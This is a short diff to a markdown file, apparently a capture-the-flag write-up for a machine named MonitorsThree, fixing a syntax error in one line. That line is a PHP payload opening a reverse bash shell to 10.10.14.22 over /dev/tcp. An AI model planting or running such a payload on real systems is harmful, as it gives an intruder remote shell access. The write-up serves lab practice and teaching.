@@ -488,7 +488,7 @@ Before running the script, we're going to replace the `"$filedata"` content with
 <br />
 
 ```php
-$filedata = "<?php system('bash -c \"bash -i >& /dev/tcp/10.10.14.22/443 0>&1\"'); ?>");
+$filedata = "<?php system('bash -c \"bash -i >& /dev/tcp/10.10.14.22/443 0>&1\"'); ?>";
 ```
 
 <br />
@@ -1233,4 +1233,3 @@ marcus@monitorsthree:/dev/shm$ cat root.txt
 ```
 
 <br />
-
